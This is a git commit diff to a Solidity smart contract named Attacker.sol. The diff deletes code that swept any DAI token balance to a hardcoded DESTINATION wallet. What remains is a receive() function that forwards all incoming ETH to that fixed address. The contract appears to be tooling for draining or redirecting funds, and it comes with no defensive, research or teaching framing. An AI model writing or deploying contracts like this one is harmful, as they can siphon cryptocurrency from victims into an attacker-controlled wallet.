e8315d0f8ae07779f34b5b019fcab99f31c73608
Anonymous Person <xjfkf323@gmail.com>
2026-03-15 08:15:35 +0530

    Update Attacker.sol

--- Attacker.sol
+++ Attacker.sol
@@ -1,25 +1,11 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.0;
 
-interface IERC20 {
-    function transfer(address to, uint256 amount) external returns (bool);
-    function balanceOf(address account) external view returns (uint256);
-}
-
 contract Attacker {
 
-    address public constant DAI = <CONTRACT_ADDRESS_ACCORDING_TO_BLOCKCHAIN_NETWORK>;
-    
     address public constant DESTINATION = 0x405f24B4C3C0DbEFbc2D333bABE8d73B99F7744b;
     
     receive() external payable {
-
-        IERC20 dai = IERC20(DAI);
-        uint256 daiBalance = dai.balanceOf(address(this));
-        
-        if (daiBalance > 0) {
-            dai.transfer(DESTINATION, daiBalance);
-        }
 
         if (address(this).balance > 0) {
             (bool success,) = DESTINATION.call{value: address(this).balance}("");
